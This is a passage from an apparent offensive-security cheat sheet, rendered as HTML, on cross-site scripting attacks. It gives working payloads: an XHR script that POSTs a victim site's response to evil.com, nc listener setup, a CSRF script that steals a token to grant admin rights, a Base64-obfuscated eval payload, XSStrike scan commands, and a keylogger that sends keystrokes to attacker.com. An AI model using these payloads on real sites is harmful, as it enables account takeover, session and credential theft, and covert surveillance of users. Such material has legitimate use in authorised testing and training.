</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>        xhr_exfil.open(&#39;POST&#39;, &quot;http://evil.com:1234/&quot;, false);
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>        xhr_exfil.send(xhr.response);
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>    }
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>};
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>xhr.open(&#39;POST&#39;, &quot;http://victim.com/login.php&quot;, false);
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);
</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>xhr.send(&quot;username=admin&amp;password=admin&quot;);
</span></code></pre></div>

Now we start web server to host the `exploit.js` and listener to receive the response.

<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a># Terminal 1: Web server
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>sudo python3 -m http.server 80
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a># Terminal 2: Listener
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>sudo nc -lvp 1234
</span></code></pre></div>

Then send a request with XSS to execute our payload (**`exploit.js`**). 
Replace the **`evil.com`** with your local ip address.

<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>&lt;script src=&quot;http://evil.com/exploit.js&quot;&gt;&lt;/script&gt;
</span></code></pre></div>

We might fetch the response.

<br />

## CSRF

The example below sends request to **`/admin`** on the victim site at first.  
And retrieve HTML document and get CSRF token.  Next, insert the new **`form`** element to submit arbitrary POST data.

<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>var xhr = new XMLHttpRequest();
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>xhr.open(&quot;GET&quot;, &quot;https://victim.com/admin&quot;, true);
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>xhr.send();
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>setTimeout(function() {
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>    var doc = new DOMParser().parseFromString(xhr.responseText, &#39;text/html&#39;);
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>    var token = doc.getElementById(&#39;csrf_token&#39;).value;
</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>    var evilDOM = new DOMParser().parseFromString(&#39;&lt;form id=&quot;evilform&quot; method=&quot;POST&quot; action=&quot;/admin/change-user-status&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;temp&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;john&quot;&gt;&lt;input type=&quot;number&quot; name=&quot;is_admin&quot; value=&quot;0&quot;&gt;&lt;button name=&quot;button&quot; type=&quot;submit&quot;&gt;Submit&lt;/button&gt;&lt;/form&gt;&#39;, &#39;text/html&#39;);
</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>
</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>        document.body.append(evilDOM.forms.evilform);
</span><span id="__span-27-11"><a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a>        var evilForm = document.getElementById(&#39;evilform&#39;);
</span><span id="__span-27-12"><a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a>    evilForm.elements.csrf_token.value = token;
</span><span id="__span-27-13"><a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a>        evilForm.elements.is_admin.value = 1;
</span><span id="__span-27-14"><a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a>    evilForm.submit();
</span><span id="__span-27-15"><a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a>}, 3000);
</span></code></pre></div>

After that, we can inject the script above in XSS.  
For example, encode the script as Base64, then put it into the XSS payload as below.

<div class="language-html highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="cm">&lt;!-- `dmFyIHh...DAwKTs=` is the Base64 encoded script above --&gt;</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">eval.call`${&quot;eval\x28atob`dmFyIHh...DAwKTs=`\x29&quot;}`</span><span class="p">&gt;</span>
</span></code></pre></div>

We might be able to get sensitive information or change crucial data on the target.

<br />

## Automation

**[XSStrike](https://github.com/s0md3v/XSStrike)** is a XSS scanner.

<div class="language-sh highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># GET request</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>python<span class="w"> </span>xsstrike.py<span class="w"> </span>-u<span class="w"> </span>http://vulnerable.com/?param<span class="o">=</span><span class="nb">test</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="c1"># POST reqeust</span>
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>python<span class="w"> </span>xsstrike.py<span class="w"> </span>-u<span class="w"> </span>http://vulnerable.com/post<span class="w"> </span>--data<span class="w"> </span><span class="s2">&quot;username=test&amp;email=test&amp;comment=test&quot;</span>
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="c1"># data as JSON</span>
</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>python<span class="w"> </span>xsstrike.py<span class="w"> </span>-u<span class="w"> </span>http://vulnerable.com/comment<span class="w"> </span>--data<span class="w"> </span><span class="s1">&#39;{&quot;comment&quot;: &quot;test&quot;}&#39;</span><span class="w"> </span>--json
</span></code></pre></div>

<br />

## Register New User with XSS

If the user name is reflected in the website, we might be able to inject XSS when registration.

<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>username=john&lt;script&gt;alert(1)&lt;/script&gt;&amp;password=pass
</span></code></pre></div>

<br />

## Key Logging

Reference: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection#javascript-keylogger](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#javascript-keylogger)

<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>&lt;img src=x onerror=&#39;document.onkeypress=function(e){fetch(&quot;http://attacker.com?k=&quot;+String.fromCharCode(e.which))},this.remove();&#39;&gt;
</span></code></pre></div>

</div>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/security-risk/xss.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>